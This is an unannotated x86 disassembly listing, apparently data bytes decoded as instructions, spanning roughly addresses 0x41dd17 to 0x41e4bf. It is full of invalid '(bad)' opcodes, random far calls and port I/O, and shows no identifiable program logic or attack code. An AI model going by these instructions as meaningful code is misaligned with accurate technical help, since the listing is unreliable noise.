  41dd17:	ja     0x41dd2f
  41dd19:	mov    ch,0x29
  41dd1b:	jecxz  0x41dd6f
  41dd1d:	lea    esp,[ebx]
  41dd1f:	xor    edx,DWORD PTR [ebp+0x7d46d818]
  41dd25:	out    0xad,eax
  41dd27:	cs out dx,al
  41dd29:	fistp  WORD PTR [ebx-0x77]
  41dd2c:	ret    
  41dd2d:	imul   edx,edx,0x20dbbf9a
  41dd33:	pop    ebx
  41dd34:	add    esi,edi
  41dd36:	xor    al,0x62
  41dd38:	push   ss
  41dd39:	and    bl,bh
  41dd3b:	add    al,0x90
  41dd3d:	push   ss
  41dd3e:	mov    ecx,0x53113da2
  41dd43:	adc    eax,0x7669d56e
  41dd48:	dec    eax
  41dd49:	(bad)  
  41dd4a:	lea    esp,[esi+0x7ca4b73a]
	...
  41dd58:	add    BYTE PTR [eax],al
  41dd5a:	add    BYTE PTR [edx+0x4],dl
  41dd5d:	mov    ds:0x72a6f682,al
  41dd62:	aam    0x6d
  41dd64:	xor    dh,BYTE PTR [edx]
  41dd66:	and    eax,0x2b68398b
  41dd6b:	dec    edi
  41dd6c:	fwait
  41dd6d:	add    DWORD PTR [eax],eax
  41dd6f:	lods   eax,DWORD PTR ds:[esi]
  41dd70:	add    BYTE PTR [eax],al
  41dd72:	add    BYTE PTR [ecx-0x69],ah
  41dd75:	jl     0x41ddbd
  41dd77:	stos   DWORD PTR es:[edi],eax
  41dd78:	test   BYTE PTR [ebx],0x27
  41dd7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd7c:	fcmovnu st,st(5)
  41dd7e:	pop    esi
  41dd7f:	retf   
  41dd80:	bswap  ecx
  41dd82:	fsub   QWORD PTR [esi-0x34]
  41dd85:	xchg   DWORD PTR ds:0x95d3af92,esi
  41dd8b:	fs xchg edi,eax
  41dd8d:	outs   dx,WORD PTR ds:[esi]
  41dd8f:	pop    edx
  41dd90:	(bad)  
  41dd91:	loope  0x41dd16
  41dd93:	mov    ecx,0x18f000bf
  41dd99:	push   ecx
  41dd9a:	daa    
  41dd9b:	push   eax
  41dd9c:	call   0xe3f1:0xb6f1de11
  41dda3:	push   edx
  41dda4:	add    eax,0x847d4183
  41dda9:	repz push 0x10
  41ddac:	push   ebx
  41ddad:	cmp    ebx,DWORD PTR [eax-0xc]
  41ddb0:	retf   
  41ddb1:	(bad)  
  41ddb2:	adc    BYTE PTR [ebp-0x9],dh
  41ddb5:	adc    ebx,esp
  41ddb7:	jle    0x41dd44
  41ddb9:	outs   dx,DWORD PTR ds:[esi]
  41ddba:	mov    edi,0x30766a5d
  41ddbf:	push   0x6ed500c8
  41ddc4:	fcom   QWORD PTR [ebx]
  41ddc6:	fs and al,0xa2
  41ddc9:	mov    al,ds:0x380c839a
  41ddce:	jne    0x41dd7f
  41ddd0:	or     edx,DWORD PTR [ebp+edi*4+0x2a]
  41ddd4:	sub    DWORD PTR [ecx-0x1],esp
  41ddd7:	repz test eax,0x27e50b6e
  41dddd:	(bad)  
  41ddde:	sub    eax,0x37b096ca
  41dde3:	repz sbb al,0x11
  41dde6:	rol    DWORD PTR [edi],cl
  41dde8:	addr16 mov al,0xde
  41ddeb:	inc    esp
  41ddec:	retf   
  41dded:	mov    edi,0xfa01ff62
  41ddf2:	lods   eax,DWORD PTR ds:[esi]
  41ddf3:	mov    cl,0xc
  41ddf5:	ss (bad) 
  41ddf7:	outs   dx,BYTE PTR ds:[esi]
  41ddf8:	fsubr  QWORD PTR [edi-0x2b]
  41ddfb:	inc    eax
  41ddfc:	shld   DWORD PTR [ebp-0x41],esi,cl
  41de00:	jecxz  0x41de31
  41de02:	jns    0x41de2f
  41de04:	mov    eax,ds:0xb1535138
  41de09:	push   0x427a1833
  41de0e:	rcl    DWORD PTR [esi+ecx*1],cl
  41de11:	lods   eax,DWORD PTR ds:[esi]
  41de12:	push   cs
  41de13:	jge    0x41de64
  41de15:	cwde   
  41de16:	sbb    ecx,eax
  41de18:	daa    
  41de19:	repnz nop
  41de1b:	(bad)  
  41de1c:	lods   al,BYTE PTR ds:[esi]
  41de1d:	arpl   WORD PTR [esi],sp
  41de1f:	stos   DWORD PTR es:[edi],eax
	...
  41de28:	add    BYTE PTR [eax],al
  41de2a:	add    BYTE PTR [eax],bh
  41de2c:	push   0xffffff96
  41de2e:	add    edx,esi
  41de30:	(bad)  
  41de31:	mov    ebp,0xdb4ef67b
  41de36:	out    0x88,eax
  41de38:	push   cs
  41de39:	cli    
  41de3a:	ds cld 
  41de3c:	fwait
  41de3d:	add    DWORD PTR [eax],eax
  41de3f:	lods   eax,DWORD PTR ds:[esi]
  41de40:	add    BYTE PTR [eax],al
  41de42:	add    BYTE PTR [ecx-0x74],dh
  41de45:	lds    ebx,FWORD PTR [edx]
  41de47:	mov    al,ds:0xd206c204
  41de4c:	dec    edi
  41de4d:	lods   eax,DWORD PTR ds:[esi]
  41de4e:	imul   eax,DWORD PTR [edx+0x2544812d],0x8d950361
  41de58:	sub    eax,DWORD PTR [ebp+0x62]
  41de5b:	sbb    eax,0xce3d1bc0
  41de60:	test   BYTE PTR [edi+edi*4-0x8d92369],cl
  41de67:	jp     0x41ddfb
  41de69:	xchg   ebx,eax
  41de6a:	mov    ah,dl
  41de6c:	jle    0x41ded3
  41de6e:	jp     0x41ded2
  41de70:	sbb    bh,dl
  41de72:	loop   0x41de1f
  41de74:	jge    0x41dece
  41de76:	stos   DWORD PTR es:[edi],eax
  41de77:	in     al,0xbf
  41de79:	imul   eax,DWORD PTR [edx-0x401f0af],0x578234ce
  41de83:	sbb    al,0xef
  41de85:	adc    eax,DWORD PTR [edi]
  41de87:	int    0xe5
  41de89:	dec    esp
  41de8a:	mov    WORD PTR [ebx-0x61429c2e],es
  41de90:	jle    0x41def7
  41de92:	mov    bx,0x4a78
  41de96:	retf   
  41de97:	and    ebx,edx
  41de99:	test   al,0x16
  41de9b:	(bad)  
  41de9d:	push   0x47
  41de9f:	sbb    BYTE PTR [edx+0x4b157228],0xda
  41dea6:	mov    eax,ds:0xcdd16f9e
  41deab:	jns    0x41de70
  41dead:	aas    
  41deae:	lock and cl,BYTE PTR [eax+0x35]
  41deb2:	push   0xb5a343ae
  41deb7:	jno    0x41deb2
  41deb9:	mov    dl,0x1c
  41debb:	push   0xd627d26
  41dec0:	sub    BYTE PTR [edi],cl
  41dec2:	(bad)  
  41dec3:	retf   0x61a9
  41dec6:	add    edi,ecx
  41dec8:	sbb    al,0xdd
  41deca:	outs   dx,DWORD PTR ds:[esi]
  41decb:	jb     0x41de7e
  41decd:	push   ds
  41dece:	outs   dx,BYTE PTR ds:[esi]
  41decf:	mov    ah,0xcf
  41ded1:	inc    edx
  41ded2:	cmp    DWORD PTR [ebx],eax
  41ded4:	loope  0x41df02
  41ded6:	fisttp WORD PTR [ebx-0x58c01f7f]
  41dedc:	mov    esi,0x114fb755
  41dee1:	or     ebp,edi
  41dee3:	fwait
  41dee4:	sbb    ah,dl
  41dee6:	add    dh,al
  41dee8:	test   ebp,edx
  41deea:	mov    ds:0x727ceef,eax
  41deef:	add    al,BYTE PTR [eax]
	...
  41def9:	add    BYTE PTR [eax],al
  41defb:	jmp    0x7a7259b9
  41df00:	repz jmp 0x41defc
  41df03:	fimul  DWORD PTR [esp+eax*2+0x6c]
  41df07:	(bad)  
  41df08:	lds    ecx,FWORD PTR [ecx-0x79]
  41df0b:	test   eax,0xad00019c
  41df10:	add    BYTE PTR [eax],al
  41df12:	add    BYTE PTR [edx+0x237113e],bl
  41df18:	lds    esi,FWORD PTR [ebx]
  41df1a:	push   ds
  41df1b:	push   ecx
  41df1c:	es mov esi,0x956267a5
  41df22:	call   0xae3c:0xb2041bb9
  41df29:	lea    edx,[eax-0x74b4db6a]
  41df2f:	cmp    al,BYTE PTR [ecx+0x11032ad0]
  41df35:	xchg   esp,eax
  41df36:	stos   DWORD PTR es:[edi],eax
  41df37:	shl    DWORD PTR [eax+0x225b4cf],cl
  41df3d:	adc    esp,edx
  41df3f:	push   cs
  41df40:	sub    eax,0x9f2e1c4d
  41df45:	nop
  41df46:	cmc    
  41df47:	lea    ebx,[ebx+0x25]
  41df4a:	loopne 0x41df38
  41df4c:	sub    eax,edi
  41df4e:	out    dx,al
  41df4f:	mov    al,0x37
  41df51:	adc    BYTE PTR [eax+0x2870642a],ah
  41df57:	addr16 fwait
  41df59:	sbb    DWORD PTR [ebp-0x3cf70ec6],ebp
  41df5f:	mov    al,0x99
  41df61:	fimul  DWORD PTR ds:0xad8cea1
  41df67:	pop    esp
  41df68:	aaa    
  41df69:	pop    ss
  41df6a:	fldcw  WORD PTR [esp+edi*1-0x734ce15a]
  41df71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df72:	xor    bl,dh
  41df74:	ret    0xdba0
  41df77:	sub    BYTE PTR [edx+ecx*1+0x17],bh
  41df7b:	adc    edx,DWORD PTR [ebx+0x3b]
  41df7e:	out    dx,eax
  41df7f:	pop    edi
  41df80:	cmp    BYTE PTR [edx+ecx*8],bl
  41df83:	in     al,0xf7
  41df85:	paddd  mm2,QWORD PTR [edi]
  41df88:	mov    bh,0x5
  41df8a:	cmp    ah,bl
  41df8c:	ret    
  41df8d:	in     eax,dx
  41df8e:	fisttp QWORD PTR [edx+0x58e0f955]
  41df94:	mov    esi,0x1d71acb7
  41df99:	out    0xbe,al
  41df9b:	int    0xf3
  41df9d:	sti    
  41df9e:	std    
  41df9f:	repnz das 
  41dfa1:	adc    al,BYTE PTR [esi+0x4a]
  41dfa4:	mov    DWORD PTR [ecx+0x569ba334],ecx
  41dfaa:	loop   0x41df92
  41dfac:	cwde   
  41dfad:	(bad)  
  41dfaf:	push   ss
  41dfb0:	cdq    
  41dfb1:	aam    0x9e
  41dfb3:	fild   QWORD PTR [edx-0x45af5ccb]
  41dfb9:	jb     0x41e001
  41dfbb:	shr    BYTE PTR ds:0x354ccc,cl
	...
  41dfc9:	add    BYTE PTR [eax],al
  41dfcb:	pop    ebx
  41dfcc:	inc    ecx
  41dfcd:	pop    ebx
  41dfce:	iret   
  41dfcf:	pop    ebx
  41dfd0:	(bad)  
  41dfd2:	aad    0xf
  41dfd4:	ss dec esp
  41dfd6:	dec    esi
  41dfd7:	ror    DWORD PTR [ecx+edx*8+0x4f],cl
  41dfdb:	push   esi
  41dfdc:	popf   
  41dfdd:	add    DWORD PTR [eax],eax
  41dfdf:	lods   eax,DWORD PTR ds:[esi]
  41dfe0:	add    BYTE PTR [eax],al
  41dfe2:	add    BYTE PTR [edi+ebp*8+0x4af96345],dh
  41dfe9:	xchg   esi,eax
  41dfea:	xchg   eax,ecx
  41dfec:	add    eax,0x6eb834b8
  41dff1:	pusha  
  41dff2:	lahf   
  41dff3:	dec    esp
  41dff4:	das    
  41dff5:	mov    edi,ss
  41dff7:	pop    ebx
  41dff8:	shl    BYTE PTR [eax+0x4b],cl
  41dffb:	inc    edx
  41dffc:	cmp    DWORD PTR [ebx],edi
  41dffe:	fild   QWORD PTR [ebx]
  41e000:	bnd jp 0x41dfaa
  41e003:	push   edi
  41e004:	sbb    BYTE PTR [ebx+0x6d36e161],bl
  41e00a:	sbb    DWORD PTR [esi+0x5f],ebx
  41e00d:	dec    ecx
  41e00e:	dec    edi
  41e00f:	jb     0x41e014
  41e011:	cdq    
  41e012:	icebp  
  41e013:	mov    eax,0x6dae46b6
  41e018:	sbb    eax,0xe2892396
  41e01d:	repz and ebp,esp
  41e020:	stc    
  41e021:	lock or al,0xaa
  41e024:	cmp    eax,0x24baeda6
  41e029:	ins    BYTE PTR es:[edi],dx
  41e02a:	inc    esp
  41e02b:	stos   BYTE PTR es:[edi],al
  41e02c:	scas   eax,DWORD PTR es:[edi]
  41e02d:	or     al,0xa5
  41e02f:	hlt    
  41e030:	stc    
  41e031:	push   0x6e
  41e033:	ins    BYTE PTR es:[edi],dx
  41e034:	add    eax,0x1608a821
  41e039:	push   es
  41e03a:	in     eax,dx
  41e03b:	mov    edx,0x27dcde7
  41e040:	fsubp  st(6),st
  41e042:	dec    esi
  41e043:	daa    
  41e044:	ja     0x41e00e
  41e046:	jmp    0x41dfda
  41e048:	sub    al,0x88
  41e04a:	fdiv   st(0),st
  41e04c:	xor    BYTE PTR [edx+ecx*8],dl
  41e04f:	call   0x440b:0xbff92ce4
  41e056:	fwait
  41e057:	mov    BYTE PTR [eax-0x29c964a7],bl
  41e05d:	sbb    BYTE PTR [esi+0x1a07e5e6],cl
  41e063:	jl     0x41e09a
  41e065:	or     al,0x23
  41e067:	pop    esp
  41e068:	push   es
  41e069:	xchg   ebx,eax
  41e06a:	std    
  41e06b:	pop    ds
  41e06c:	jns    0x41e0bc
  41e06e:	(bad)  
  41e06f:	test   BYTE PTR [eax+0x224c54e1],0xce
  41e076:	inc    edx
  41e077:	dec    ecx
  41e078:	cdq    
  41e079:	test   ax,0x8b12
  41e07d:	mov    bl,0x19
  41e07f:	adc    DWORD PTR [eax],esp
  41e081:	pop    ebp
  41e082:	add    esp,DWORD PTR [ecx+edx*8+0x150814c6]
  41e089:	cld    
  41e08a:	popa   
  41e08b:	sub    DWORD PTR [edx],0xffffff80
  41e08e:	pop    ebx
  41e08f:	add    eax,0x0
  41e094:	add    BYTE PTR [eax],al
  41e096:	add    BYTE PTR [eax],al
  41e098:	add    BYTE PTR [eax],al
  41e09a:	add    BYTE PTR [ebx+0x7f3c6585],bl
  41e0a0:	cld    
  41e0a1:	(bad)  [edi-0x65be08a1]
  41e0a7:	sbb    BYTE PTR [edi-0x61fcc4f4],dh
  41e0ad:	add    DWORD PTR [eax],eax
  41e0af:	lods   eax,DWORD PTR ds:[esi]
  41e0b0:	add    BYTE PTR [eax],al
  41e0b2:	add    BYTE PTR [eax],dl
  41e0b4:	vmwrite ecx,DWORD PTR [edi-0x1e3fb316]
  41e0bb:	push   0x950b0d44
  41e0c0:	add    eax,0xd0ac73c7
  41e0c5:	in     eax,0xb
  41e0c7:	xlat   BYTE PTR ds:[ebx]
  41e0c8:	sar    BYTE PTR [ebx+0x17],cl
  41e0cb:	cwde   
  41e0cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0cd:	fcom   DWORD PTR [edi-0x27e5d6f9]
  41e0d3:	out    0x9a,eax
  41e0d5:	inc    edx
  41e0d6:	popa   
  41e0d7:	xchg   edi,eax
  41e0d8:	mov    ds:0x45c8ea8f,eax
  41e0dd:	push   esp
  41e0de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0df:	inc    edx
  41e0e0:	outs   dx,DWORD PTR ds:[esi]
  41e0e1:	sub    eax,0xec41fc76
  41e0e6:	xor    al,0x12
  41e0e8:	adc    al,0x28
  41e0ea:	inc    ebx
  41e0eb:	repnz das 
  41e0ed:	push   cs
  41e0ee:	ss pop esp
  41e0f0:	and    bh,BYTE PTR [esi-0x23]
  41e0f3:	cdq    
  41e0f4:	(bad)  
  41e0f5:	fsubr  QWORD PTR [esi]
  41e0f7:	lock mov ds:0x9db99ff0,eax
  41e0fd:	cwde   
  41e0fe:	or     DWORD PTR [ebp+0x78],eax
  41e101:	cmp    ebx,DWORD PTR [ebx+0x2e]
  41e104:	in     al,dx
  41e105:	jmp    0x5ca67f34
  41e10a:	lds    ebp,FWORD PTR [ebp-0x30e21c73]
  41e110:	ror    BYTE PTR [edi-0x9],0xf1
  41e114:	or     eax,DWORD PTR [esi-0x2b]
  41e117:	sub    dl,BYTE PTR [edx-0x662817a5]
  41e11d:	mov    al,0xf7
  41e11f:	fwait
  41e120:	nop
  41e121:	sub    BYTE PTR [edi+0x7b32a5b4],al
  41e127:	ror    DWORD PTR [ebp+eax*8-0x69],1
  41e12b:	in     eax,0xb5
  41e12d:	push   ebp
  41e12e:	js     0x41e109
  41e130:	fsubr  QWORD PTR [esi+eiz*1]
  41e133:	xor    eax,0xc58ffcd6
  41e138:	mov    al,0x84
  41e13a:	xlat   BYTE PTR ds:[ebx]
  41e13b:	cdq    
  41e13c:	dec    edx
  41e13d:	and    ebp,ebx
  41e13f:	xchg   ecx,eax
  41e140:	scas   eax,DWORD PTR es:[edi]
  41e141:	(bad)  
  41e142:	pop    ss
  41e143:	mov    edi,0x42f52885
  41e148:	mov    dh,0xff
  41e14a:	inc    esp
  41e14b:	rcr    DWORD PTR [edi+0x48cba46d],cl
  41e151:	imul   DWORD PTR [edx-0x76cd697b]
  41e157:	out    0x91,eax
  41e159:	add    DWORD PTR [edx+0x30],ebx
  41e15c:	rol    DWORD PTR [ebp+0x6],0x2d
	...
  41e168:	add    BYTE PTR [eax],al
  41e16a:	add    BYTE PTR [esi+0x73],ch
  41e16d:	lock retf 0xcbfd
  41e171:	jle    0x41e16a
  41e173:	repz xor eax,0xd20b8ce9
  41e179:	repz and al,0xb0
  41e17c:	sahf   
  41e17d:	add    DWORD PTR [eax],eax
  41e17f:	lods   eax,DWORD PTR ds:[esi]
  41e180:	add    BYTE PTR [eax],al
  41e182:	add    BYTE PTR [edx+0x52920b62],cl
  41e188:	jmp    0x559:0xc8c50eb6
  41e18f:	push   es
  41e190:	inc    ebp
  41e191:	es stos DWORD PTR es:[edi],eax
  41e193:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e194:	ss dec eax
  41e196:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e197:	pop    ecx
  41e198:	gs xchg esi,eax
  41e19a:	(bad)  
  41e19c:	out    0x7a,al
  41e19e:	jp     0x41e163
  41e1a0:	int3   
  41e1a1:	push   ecx
  41e1a2:	xor    ch,bh
  41e1a4:	add    al,0x6d
  41e1a6:	sub    esi,DWORD PTR [ecx+ecx*2]
  41e1a9:	add    al,0xee
  41e1ab:	sbb    cl,0x71
  41e1ae:	out    dx,al
  41e1af:	and    ecx,ecx
  41e1b1:	dec    ebx
  41e1b2:	pop    esi
  41e1b3:	sbb    edi,esi
  41e1b5:	in     eax,0x16
  41e1b7:	xchg   esi,eax
  41e1b8:	retf   0x365
  41e1bb:	adc    ebx,ebp
  41e1bd:	jns    0x41e16a
  41e1bf:	adc    eax,0x5e2a6a4f
  41e1c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1c5:	mov    bh,0x38
  41e1c7:	inc    ebx
  41e1c8:	mov    edi,0xe721597e
  41e1cd:	inc    esp
  41e1ce:	not    edi
  41e1d0:	addr16 inc edi
  41e1d2:	jge    0x41e1a0
  41e1d4:	fwait
  41e1d5:	mov    bl,0x7b
  41e1d7:	lods   al,BYTE PTR ds:[esi]
  41e1d8:	lea    ecx,[esi]
  41e1da:	sub    DWORD PTR [eax],edx
  41e1dc:	idiv   BYTE PTR [edi]
  41e1de:	inc    edi
  41e1df:	xchg   BYTE PTR [esp+ecx*2],bl
  41e1e2:	jno    0x41e17c
  41e1e4:	retf   0x5798
  41e1e7:	mov    al,ds:0x9966fc46
  41e1ec:	add    ch,ah
  41e1ee:	loop   0x41e19e
  41e1f0:	bound  edi,QWORD PTR [edi+0x5d43975e]
  41e1f6:	sar    DWORD PTR [ebp-0x15],1
  41e1f9:	sub    DWORD PTR [ebx+ebx*2],eax
  41e1fc:	xlat   BYTE PTR es:[ebx]
  41e1fe:	les    edi,FWORD PTR [esi+0x4acc251]
  41e204:	inc    esi
  41e205:	mov    cl,0x61
  41e207:	inc    eax
  41e208:	cmp    al,0x89
  41e20a:	cwde   
  41e20b:	ins    DWORD PTR es:[edi],dx
  41e20c:	(bad)
  41e210:	pop    eax
  41e211:	hlt    
  41e212:	rcr    BYTE PTR [ebp+0x4b],cl
  41e215:	or     eax,0x85cd639
  41e21a:	push   esp
  41e21b:	mov    eax,0x13d120a9
  41e220:	cmp    esi,DWORD PTR [esi+0x68f8fad6]
  41e226:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e227:	xor    ecx,DWORD PTR [esi+0x321419e7]
  41e22d:	rcl    DWORD PTR [ecx+0x2e],cl
	...
  41e23b:	cmc    
  41e23c:	adc    al,0xae
  41e23e:	adc    ebp,edi
  41e240:	mov    ebx,0x84e6f6fd
  41e245:	lds    ebp,FWORD PTR [edx-0x35b6af1e]
  41e24b:	pop    ebp
  41e24c:	lahf   
  41e24d:	add    DWORD PTR [eax],eax
  41e24f:	lods   eax,DWORD PTR ds:[esi]
  41e250:	add    BYTE PTR [eax],al
  41e252:	add    BYTE PTR [edi+0xd],bh
  41e255:	or     al,0xf5
  41e257:	cdq    
  41e258:	ss xchg edx,eax
  41e25a:	mov    ah,0x57
  41e25c:	ficom  WORD PTR [ecx+ebx*1-0xb]
  41e260:	mov    esp,esi
  41e262:	push   ss
  41e263:	loopne 0x41e279
  41e265:	sar    DWORD PTR [ebx+ebp*4-0x111efed2],cl
  41e26c:	out    dx,al
  41e26d:	pop    esi
  41e26e:	inc    esp
  41e26f:	outs   dx,DWORD PTR ds:[esi]
  41e270:	xchg   ecx,eax
  41e271:	mov    BYTE PTR [esi-0x25c22d54],al
  41e277:	in     al,dx
  41e278:	pop    esi
  41e279:	fiadd  WORD PTR ds:0x7c01992d
  41e27f:	cdq    
  41e280:	fcos   
  41e282:	pop    ebp
  41e283:	pop    eax
  41e284:	mov    WORD PTR [edi-0x4ef334d2],cs
  41e28a:	adc    ebx,DWORD PTR [eax-0x1b82c699]
  41e290:	sbb    dl,BYTE PTR [esp+edx*1-0x23]
  41e294:	pop    ss
  41e295:	imul   esi,DWORD PTR ds:0x266b7aa,0x7ff3ac6
  41e29f:	test   eax,0xc0e0e081
  41e2a4:	fmul   st,st(4)
  41e2a6:	es dec eax
  41e2a8:	hlt    
  41e2a9:	stc    
  41e2aa:	jb     0x41e26d
  41e2ac:	repz data16 xor al,0x3b
  41e2b0:	stos   DWORD PTR es:[edi],eax
  41e2b1:	sub    BYTE PTR [esi+ecx*2-0x12297a63],0xc0
  41e2b9:	jae    0x41e275
  41e2bb:	push   eax
  41e2bc:	lock mov esi,0x6c11e48b
  41e2c2:	nop
  41e2c3:	push   0x1e
  41e2c5:	ss repz jge 0x41e292
  41e2c9:	inc    edx
  41e2ca:	outs   dx,BYTE PTR ds:[esi]
  41e2cb:	es and al,0xce
  41e2ce:	inc    ebx
  41e2cf:	inc    eax
  41e2d0:	stc    
  41e2d1:	sbb    BYTE PTR ss:[ebp-0x15527ada],0x2c
  41e2d9:	pop    ds
  41e2da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2db:	data16 loopne 0x41e2f2
  41e2de:	stc    
  41e2df:	es lock clc 
  41e2e2:	jmp    0x41e325
  41e2e4:	ret    0xddd2
  41e2e7:	cdq    
  41e2e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2e9:	(bad)  
  41e2ea:	push   0x2
  41e2ec:	call   0x834c:0xeaa81fb2
  41e2f3:	lds    esp,FWORD PTR [ebx]
  41e2f5:	pop    ss
  41e2f6:	mov    esp,0x2d632dee
  41e2fb:	in     al,0x29
  41e2fd:	add    esi,DWORD PTR [ebp-0x3a]
	...
  41e308:	add    BYTE PTR [eax],al
  41e30a:	add    BYTE PTR [ebx],bh
  41e30c:	mov    cl,0x57
  41e30e:	lock fcomip st,st(6)
  41e311:	mov    edi,0xbb1c16fb
  41e316:	rcl    BYTE PTR [edi+0x54],0x74
  41e31a:	and    eax,0x1a00a
  41e31f:	lods   eax,DWORD PTR ds:[esi]
  41e320:	add    BYTE PTR [eax],al
  41e322:	add    bl,ch
  41e324:	mov    cl,BYTE PTR [esi-0x62]
  41e327:	fisub  DWORD PTR [ecx]
  41e329:	cmp    eax,0x95af30c6
  41e32e:	aas    
  41e32f:	and    BYTE PTR [ebx],al
  41e331:	icebp  
  41e332:	pop    ds
  41e333:	push   edi
  41e334:	xchg   ebx,eax
  41e335:	neg    esp
  41e337:	sbb    edx,DWORD PTR [eax-0x6ceea488]
  41e33d:	jns    0x41e361
  41e33f:	mov    WORD PTR [ebp-0x29d3c0a1],?
  41e345:	ret    0x1c82
  41e348:	cmc    
  41e349:	iret   
  41e34a:	je     0x41e2e3
  41e34c:	sub    DWORD PTR [esi+0x3e6e8589],ebp
  41e352:	pop    eax
  41e353:	repnz int3 
  41e355:	sbb    al,BYTE PTR [esi+0x4f]
  41e358:	loop   0x41e340
  41e35a:	mov    ch,0x9
  41e35c:	out    dx,al
  41e35d:	dec    esi
  41e35e:	sahf   
  41e35f:	adc    al,0x87
  41e361:	mov    DWORD PTR [edi+0x50b23555],ebp
  41e367:	or     DWORD PTR [eax-0x34213646],0xf6b383a8
  41e371:	xlat   BYTE PTR ds:[ebx]
  41e372:	cwde   
  41e373:	jne    0x41e2f7
  41e375:	sti    
  41e376:	les    edx,FWORD PTR [eax]
  41e378:	dec    edi
  41e379:	and    BYTE PTR [edx-0x7f64e52e],cl
  41e37f:	mov    al,ds:0x19cc8cfd
  41e384:	jnp    0x41e31a
  41e386:	adc    eax,0x42f23c4
  41e38b:	outs   dx,BYTE PTR ds:[esi]
  41e38c:	cmp    edi,DWORD PTR [ebx+0x16]
  41e38f:	popa   
  41e390:	cdq    
  41e391:	push   ebx
  41e392:	lock xchg esp,eax
  41e394:	add    DWORD PTR [ebp-0x5b],0xe207daa6
  41e39b:	inc    eax
  41e39c:	push   edi
  41e39d:	into   
  41e39e:	scas   eax,DWORD PTR es:[edi]
  41e39f:	cld    
  41e3a0:	popa   
  41e3a1:	mov    bl,0x48
  41e3a3:	in     eax,dx
  41e3a4:	adc    eax,0x258cde25
  41e3a9:	adc    bl,BYTE PTR cs:[edx-0x79]
  41e3ad:	jne    0x41e3b0
  41e3af:	pop    esp
  41e3b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3b1:	into   
  41e3b2:	loop   0x41e3ce
  41e3b4:	inc    ecx
  41e3b5:	jno    0x41e3f2
  41e3b7:	jne    0x41e3a9
  41e3b9:	clc    
  41e3ba:	sahf   
  41e3bb:	lahf   
  41e3bc:	ss cmc 
  41e3be:	add    BYTE PTR [edx+0x3728b8b5],ch
  41e3c4:	sbb    BYTE PTR [edx],0x19
  41e3c7:	pop    ebp
  41e3c8:	mov    ecx,0xf67b0f5
  41e3cd:	mov    BYTE PTR [edi],bl
  41e3cf:	mov    BYTE PTR [eax],0x0
	...
  41e3da:	add    ah,dl
  41e3dc:	sqrtps xmm6,xmm0
  41e3df:	(bad)  
  41e3e1:	cmc    
  41e3e2:	das    
  41e3e3:	sbb    BYTE PTR [eax],cl
  41e3e5:	xchg   ebx,eax
  41e3e6:	iret   
  41e3e7:	in     eax,dx
  41e3e8:	cli    
  41e3e9:	push   0x1a0b7ca
  41e3ee:	add    BYTE PTR [ebp+0xc000000],ch
  41e3f4:	and    DWORD PTR [esi-0x9df2d65],0x37
  41e3fb:	pusha  
  41e3fc:	fiadd  DWORD PTR [edx]
  41e3fe:	inc    edx
  41e3ff:	cmp    ch,BYTE PTR [edx+0x1c2dbae9]
  41e405:	sbb    DWORD PTR [ebp-0x54],ebp
  41e408:	iret   
  41e409:	rcr    DWORD PTR [esi+0x3c],0xa
  41e40d:	mov    eax,ds:0x8bfacad8
  41e412:	mov    ah,0x6d
  41e414:	mov    esp,0xa05ce783
  41e419:	sti    
  41e41a:	in     eax,0x1
  41e41c:	sahf   
  41e41d:	cs retf 0xc161
  41e421:	test   al,0x71
  41e423:	loopne 0x41e3e1
  41e425:	cmp    DWORD PTR [edi+0x40],ecx
  41e428:	aad    0x45
  41e42a:	xchg   DWORD PTR [ebx-0x69],esi
  41e42d:	popa   
  41e42e:	cld    
  41e42f:	clc    
  41e430:	xchg   esp,eax
  41e431:	mov    ds:0xeab9b5ce,eax
  41e436:	jge    0x41e40d
  41e438:	dec    ebp
  41e439:	loope  0x41e4b6
  41e43b:	pop    ebx
  41e43c:	sbb    esi,DWORD PTR [ebx]
  41e43e:	jb     0x41e42d
  41e440:	ficomp DWORD PTR [ebx+0x43bfaa8]
  41e446:	retf   0x84de
  41e449:	test   al,0x77
  41e44b:	nop
  41e44c:	bound  ebp,QWORD PTR [ebx-0x76]
  41e44f:	inc    esi
  41e450:	inc    eax
  41e451:	sbb    edi,DWORD PTR [eax-0x4e4b009d]
  41e457:	push   cs
  41e458:	jge    0x41e446
  41e45a:	inc    edi
  41e45b:	pop    ecx
  41e45c:	bound  eax,QWORD PTR [edx-0x233cb935]
  41e462:	push   edx
  41e463:	jmp    0x4c8a10c7
  41e468:	push   cs
  41e469:	push   0xffffff82
  41e46b:	push   ebx
  41e46c:	cmp    cl,cl
  41e46e:	(bad)  
  41e46f:	xor    DWORD PTR [ecx-0x3],edx
  41e472:	dec    esp
  41e473:	mov    edi,0xe1d0f707
  41e478:	push   ss
  41e479:	int3   
  41e47a:	lods   al,BYTE PTR ds:[esi]
  41e47b:	scas   al,BYTE PTR es:[edi]
  41e47c:	xchg   dh,bh
  41e47e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e47f:	sub    BYTE PTR [ebp+0x72],bl
  41e482:	call   DWORD PTR [ecx+0x1732f7f3]
  41e488:	(bad)  
  41e489:	cmc    
  41e48a:	call   0xe16a047
  41e48f:	(bad)  
  41e490:	mov    esp,0xc2a23206
  41e495:	dec    ecx
  41e496:	(bad)  
  41e498:	mov    eax,DWORD PTR [edi+edx*4]
  41e49b:	les    edx,FWORD PTR [edi+0x7aa04d]
	...
  41e4a9:	add    BYTE PTR [eax],al
  41e4ab:	int    0x2d
  41e4ad:	xchg   ebp,eax
  41e4ae:	inc    ebx
  41e4af:	cmc    
  41e4b0:	sti    
  41e4b1:	fild   QWORD PTR [edi-0x5bdf5fa9]
  41e4b7:	mov    cs:0xa164c4d6,eax
  41e4bd:	add    DWORD PTR [eax],eax
  41e4bf:	lods   eax,DWORD PTR ds:[esi]
